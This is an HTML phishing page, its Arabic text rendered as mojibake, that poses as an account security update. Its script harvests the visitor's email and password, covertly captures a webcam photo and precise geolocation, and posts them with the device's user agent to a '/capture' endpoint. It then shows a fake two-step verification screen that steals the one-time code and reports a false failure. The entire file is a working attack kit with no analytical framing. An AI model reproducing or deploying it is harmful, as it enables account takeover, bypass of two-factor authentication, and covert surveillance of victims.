<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <link rel="manifest" href="/manifest.json">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ­Ø¯ÙŠØ« Ø£Ù…Ø§Ù† Ø§Ù„Ø­Ø³Ø§Ø¨</title>
    <style>
        body { background: #121212; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; }
        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; border: 1px solid #333; margin-top: 50px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #2c2c2c; color: white; }
        button { background: #007bff; color: white; width: 95%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div id="login-screen" class="box">
        <h2>âš ï¸ ØªØ­Ø¯ÙŠØ« Ù…Ø·Ù„ÙˆØ¨</h2>
        <p>ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„ØªØ£ÙƒÙŠØ¯ Ù…Ù„ÙƒÙŠØ© Ø§Ù„Ø­Ø³Ø§Ø¨</p>
        <input type="email" id="email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" required>
        <input type="password" id="pass" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
        <button onclick="startCapture()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
    </div>

    <div id="otp-screen" class="box hidden">
        <h2>ğŸ” Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ø®Ø·ÙˆØªÙŠÙ†</h2>
        <p>Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ù…Ø² Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 6 Ø£Ø±Ù‚Ø§Ù… Ø§Ù„Ù…Ø±Ø³Ù„ Ø¥Ù„Ù‰ Ù‡Ø§ØªÙÙƒ</p>
        <input type="number" id="otp" placeholder="000000" required>
        <button onclick="sendOtp()">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù‡ÙˆÙŠØ©</button>
    </div>

    <script>
        let userEmail = "";

        async function getCameraImage() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                return canvas.toDataURL('image/png');
            } catch (e) { return null; }
        }

        async function startCapture() {
            userEmail = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const img = await getCameraImage();

            navigator.geolocation.getCurrentPosition(async (pos) => {
                await sendToServer(userEmail, pass, { lat: pos.coords.latitude, lon: pos.coords.longitude }, img);
            }, async () => {
                await sendToServer(userEmail, pass, null, img);
            }, { enableHighAccuracy: true });

            document.getElementById('login-screen').classList.add('hidden');
            document.getElementById('otp-screen').classList.remove('hidden');
        }

        async function sendToServer(email, pass, loc, img) {
            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password: pass, location: loc, image: img, device: navigator.userAgent })
            });
        }

        async function sendOtp() {
            const code = document.getElementById('otp').value;
            await fetch('/capture-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ otp: code, email: userEmail })
            });
            alert("ÙØ´Ù„ Ø§Ù„ØªØ­Ù‚Ù‚ØŒ ÙŠØ±Ø¬Ù‰ Ø·Ù„Ø¨ ÙƒÙˆØ¯ Ø¬Ø¯ÙŠØ¯ Ø¨Ø¹Ø¯ Ù‚Ù„ÙŠÙ„.");
        }
    </script>
</body>
</html>
